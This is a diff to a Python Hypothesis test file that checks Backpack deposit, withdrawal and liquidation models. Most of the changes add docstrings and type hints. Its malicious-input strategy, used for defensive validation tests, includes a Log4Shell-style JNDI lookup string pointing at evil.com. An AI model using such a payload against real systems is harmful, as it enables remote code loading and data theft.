@@ -1,7 +1,8 @@
 """Property-based tests for Backpack raw transfer models.
 
 These tests validate critical security boundary models that process external transfer data.
-The models tested here are essential for deposit/withdrawal processing, liquidation handling, and transfer status tracking.
+The models tested here are essential for deposit/withdrawal processing, liquidation handling,
+and tracking.
 
 SECURITY CRITICAL: These raw models protect against:
 - Malicious transfer data that could manipulate financial records
@@ -18,14 +19,14 @@ from decimal import Decimal
 from typing import Any
 
 import pytest
-from hypothesis import given, strategies as st, assume
+from hypothesis import assume, given, strategies as st
 from hypothesis.strategies import SearchStrategy
 from pydantic import ValidationError
 
 from cyberdelta.apis.backpack.models.bp_raw_transfer import (
-    BackpackRawWithdrawal,
     BackpackRawDeposit,
     BackpackRawLiquidation,
+    BackpackRawWithdrawal,
 )
 from cyberdelta.exceptions.field_validation import TypeFieldError
 
@@ -36,13 +37,15 @@ from cyberdelta.exceptions.field_validation import TypeFieldError
 
 
 def transfer_amount_strategy() -> SearchStrategy[str]:
-    """Generate decimal strings for transfer amounts."""
+    """Generate decimal strings for transfer amounts.
+
+    Returns:
+        SearchStrategy generating valid decimal strings for transfer amounts.
+    """
     return st.one_of([
         # Common transfer amounts
-        st.decimals(min_value=Decimal("0"), max_value=Decimal("10000000"), places=8).map(str),
-        st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal("1000000"), places=6).map(
-            str
-        ),
+        st.decimals(min_value=Decimal(0), max_value=Decimal(10000000), places=8).map(str),
+        st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal(1000000), places=6).map(str),
         # Specific amounts
         st.just("0"),  # Zero amount
         st.just("0.0"),  # Zero with decimal
@@ -59,7 +62,11 @@ def transfer_amount_strategy() -> SearchStrategy[str]:
 
 
 def transfer_id_strategy() -> SearchStrategy[str]:
-    """Generate valid transfer IDs."""
+    """Generate valid transfer IDs.
+
+    Returns:
+        SearchStrategy generating valid transfer ID strings.
+    """
     return st.one_of([
         # Common patterns
         st.just("wd_123"),
@@ -86,7 +93,11 @@ def transfer_id_strategy() -> SearchStrategy[str]:
 
 
 def asset_symbol_strategy() -> SearchStrategy[str]:
-    """Generate valid asset symbols."""
+    """Generate valid asset symbols.
+
+    Returns:
+        SearchStrategy generating valid asset symbol strings.
+    """
     return st.one_of([
         # Common assets
         st.just("BTC"),
@@ -106,7 +117,11 @@ def asset_symbol_strategy() -> SearchStrategy[str]:
 
 
 def transfer_status_strategy() -> SearchStrategy[str]:
-    """Generate valid transfer status values."""
+    """Generate valid transfer status values.
+
+    Returns:
+        SearchStrategy generating valid transfer status strings.
+    """
     return st.sampled_from([
         "pending",
         "completed",
@@ -118,7 +133,11 @@ def transfer_status_strategy() -> SearchStrategy[str]:
 
 
 def liquidation_side_strategy() -> SearchStrategy[str]:
-    """Generate valid liquidation side values."""
+    """Generate valid liquidation side values.
+
+    Returns:
+        SearchStrategy generating valid liquidation side strings.
+    """
     return st.sampled_from([
         "buy",
         "sell",
@@ -126,7 +145,11 @@ def liquidation_side_strategy() -> SearchStrategy[str]:
 
 
 def trading_symbol_strategy() -> SearchStrategy[str]:
-    """Generate valid trading symbols for liquidations."""
+    """Generate valid trading symbols for liquidations.
+
+    Returns:
+        SearchStrategy generating valid trading symbol strings.
+    """
     return st.one_of([
         # Common trading pairs
         st.just("BTC_USDC"),
@@ -149,8 +172,12 @@ def trading_symbol_strategy() -> SearchStrategy[str]:
 
 
 @st.composite
-def valid_withdrawal_data(draw) -> dict[str, Any]:
-    """Generate valid withdrawal data."""
+def valid_withdrawal_data(draw: st.DrawFn) -> dict[str, Any]:
+    """Generate valid withdrawal data.
+
+    Returns:
+        Dictionary with valid withdrawal data fields.
+    """
     return {
         "id": draw(transfer_id_strategy()),
         "asset": draw(asset_symbol_strategy()),
@@ -160,8 +187,12 @@ def valid_withdrawal_data(draw) -> dict[str, Any]:
 
 
 @st.composite
-def valid_deposit_data(draw) -> dict[str, Any]:
-    """Generate valid deposit data."""
+def valid_deposit_data(draw: st.DrawFn) -> dict[str, Any]:
+    """Generate valid deposit data.
+
+    Returns:
+        Dictionary with valid deposit data fields.
+    """
     return {
         "id": draw(transfer_id_strategy()),
         "asset": draw(asset_symbol_strategy()),
@@ -171,8 +202,12 @@ def valid_deposit_data(draw) -> dict[str, Any]:
 
 
 @st.composite
-def valid_liquidation_data(draw) -> dict[str, Any]:
-    """Generate valid liquidation data."""
+def valid_liquidation_data(draw: st.DrawFn) -> dict[str, Any]:
+    """Generate valid liquidation data.
+
+    Returns:
+        Dictionary with valid liquidation data fields.
+    """
     return {
         "symbol": draw(trading_symbol_strategy()),
         "price": draw(transfer_amount_strategy()),
@@ -181,8 +216,12 @@ def valid_liquidation_data(draw) -> dict[str, Any]:
     }
 
 
-def malicious_transfer_strategy() -> SearchStrategy[Any]:
-    """Generate malicious values for transfer security testing."""
+def malicious_transfer_strategy() -> SearchStrategy[object]:
+    """Generate malicious values for transfer security testing.
+
+    Returns:
+        SearchStrategy generating malicious values for security testing.
+    """
     return st.one_of([
         # Financial manipulation attempts
         st.just("${jndi:ldap://evil.com/steal-transfers}"),
@@ -235,7 +274,7 @@ class TestBackpackRawWithdrawalProperties:
     def test_withdrawal_validation_success_properties(
         self, withdrawal_data: dict[str, Any]
     ) -> None:
-        """Property: Valid withdrawal data should always create valid BackpackRawWithdrawal objects."""
+        """Property: Valid withdrawal data should always create valid objects."""
         # Skip invalid decimal values
         try:
             decimal_val = Decimal(withdrawal_data["amount"])
@@ -270,10 +309,10 @@ class TestBackpackRawWithdrawalProperties:
         malicious_value=malicious_transfer_strategy(),
     )
     def test_withdrawal_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: object
     ) -> None:
         """Property: Withdrawal model should reject malicious inputs safely."""
-        base_data = {
+        base_data: dict[str, object] = {
             "id": "wd_123",
             "asset": "USDC",
             "amount": "100.0",
@@ -420,10 +459,10 @@ class TestBackpackRawDepositProperties:
         malicious_value=malicious_transfer_strategy(),
     )
     def test_deposit_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: object
     ) -> None:
         """Property: Deposit model should reject malicious inputs safely."""
-        base_data = {
+        base_data: dict[str, object] = {
             "id": "dp_456",
             "asset": "BTC",
             "amount": "0.5",
@@ -469,7 +508,7 @@ class TestBackpackRawLiquidationProperties:
     def test_liquidation_validation_success_properties(
         self, liquidation_data: dict[str, Any]
     ) -> None:
-        """Property: Valid liquidation data should always create valid BackpackRawLiquidation objects."""
+        """Property: Valid liquidation data should always create valid objects."""
         # Skip invalid decimal values
         try:
             for field in ["price", "quantity"]:
@@ -505,10 +544,10 @@ class TestBackpackRawLiquidationProperties:
         malicious_value=malicious_transfer_strategy(),
     )
     def test_liquidation_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: object
     ) -> None:
         """Property: Liquidation model should reject malicious inputs safely."""
-        base_data = {
+        base_data: dict[str, object] = {
             "symbol": "BTC_USDC",
             "price": "45000.0",
             "quantity": "0.01",
@@ -714,17 +753,17 @@ class TestBackpackRawTransferIntegrationProperties:
         transfer_status=transfer_status_strategy(), malicious_amount=malicious_transfer_strategy()
     )
     def test_transfer_status_consistency_properties(
-        self, transfer_status: str, malicious_amount: Any
+        self, transfer_status: str, malicious_amount: object
     ) -> None:
         """Property: Transfer status should be consistent across withdrawal and deposit models."""
         # Property: Valid status should work for both models
-        withdrawal_data = {
+        withdrawal_data: dict[str, object] = {
             "id": "wd_test",
             "asset": "USDC",
             "amount": "100.0",
             "status": transfer_status,
         }
-        deposit_data = {
+        deposit_data: dict[str, object] = {
             "id": "dp_test",
             "asset": "USDC",
             "amount": "100.0",
